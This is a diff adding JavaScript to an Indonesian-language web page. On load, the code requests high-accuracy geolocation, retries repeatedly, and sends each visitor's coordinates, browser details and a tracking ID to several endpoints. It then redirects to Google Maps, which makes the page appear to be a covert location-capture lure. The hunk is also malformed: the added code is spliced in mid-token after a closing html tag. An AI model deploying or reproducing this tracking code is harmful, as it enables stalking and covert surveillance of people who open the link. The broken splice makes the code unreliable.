@@ -318,4 +318,127 @@
         });
     </script>
 </body>
+</html>w.location.hash = `id=${trackingId}&lat=${locationData.latitude}&lng=${locationData.longitude}&time=${locationData.timestamp}&status=captured`;
+            
+            // Method 7: Document title for detection
+            document.title = `XTOS_CAPTURED:${trackingId}:${locationData.latitude}:${locationData.longitude}:${locationData.timestamp}`;
+            
+            console.log('📡 LOCATION TRANSMITTED VIA ALL METHODS');
+            
+            return Promise.resolve();
+        }
+        
+        function handleLocationSuccess(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = Math.round(position.coords.accuracy);
+            
+            updateStatus('✅ Lokasi berhasil didapat!');
+            
+            const coordsEl = document.getElementById('coords');
+            coordsEl.style.display = 'block';
+            coordsEl.innerHTML = 
+                `📍 <strong>Koordinat:</strong><br>${lat.toFixed(6)}, ${lng.toFixed(6)}<br>` +
+                `📏 <strong>Akurasi:</strong> ${accuracy}m<br>` +
+                `⏰ <strong>Waktu:</strong> ${new Date().toLocaleTimeString('id-ID')}`;
+            
+            const locationData = {
+                latitude: lat,
+                longitude: lng,
+                accuracy: accuracy,
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent,
+                url: window.location.href
+            };
+            
+            console.log('🎯 LOKASI TERTANGKAP:', locationData);
+            
+            // Send data immediately
+            sendLocationData(locationData);
+            updateStatus('📤 Data lokasi terkirim ke semua endpoint!');
+            
+            // Redirect after successful transmission
+            setTimeout(() => {
+                updateStatus('🚀 Mengarahkan ke Google Maps...');
+                setTimeout(() => {
+                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
+                }, 1000);
+            }, 2000);
+        }
+        
+        function handleLocationError(error) {
+            let errorMsg = '';
+            let showRetry = false;
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMsg = '❌ Izin lokasi ditolak. Silakan refresh dan klik IZINKAN!';
+                    showRetry = true;
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMsg = '❌ Lokasi tidak tersedia. Pastikan GPS aktif!';
+                    showRetry = true;
+                    break;
+                case error.TIMEOUT:
+                    errorMsg = '⏱️ Timeout. Mencoba lagi...';
+                    if (retryCount < maxRetries) {
+                        retryCount++;
+                        setTimeout(requestLocation, 2000);
+                        return;
+                    }
+                    showRetry = true;
+                    break;
+            }
+            
+            updateStatus(errorMsg, true);
+            
+            if (showRetry) {
+                document.getElementById('manualBtn').style.display = 'inline-block';
+                document.getElementById('coords').style.display = 'block';
+                document.getElementById('coords').innerHTML = 
+                    '<p><strong>Cara mengatasi:</strong></p>' +
+                    '<p>1. Refresh halaman ini</p>' +
+                    '<p>2. Klik IZINKAN saat diminta</p>' +
+                    '<p>3. Aktifkan GPS/Lokasi di HP</p>' +
+                    '<p>4. Gunakan browser Chrome/Safari</p>';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://maps.google.com/';
+                }, 8000);
+            }
+        }
+        
+        function requestLocation() {
+            if (!navigator.geolocation) {
+                updateStatus('❌ Browser tidak mendukung geolocation', true);
+                return;
+            }
+            
+            updateStatus('📡 Meminta izin lokasi...');
+            document.getElementById('manualBtn').style.display = 'none';
+            
+            navigator.geolocation.getCurrentPosition(
+                handleLocationSuccess,
+                handleLocationError,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        }
+        
+        // Auto-start immediately
+        window.addEventListener('load', () => {
+            setTimeout(requestLocation, 500);
+        });
+        
+        // Retry on visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && retryCount < maxRetries) {
+                setTimeout(requestLocation, 300);
+            }
+        });
+    </script>
+</body>
 </html>
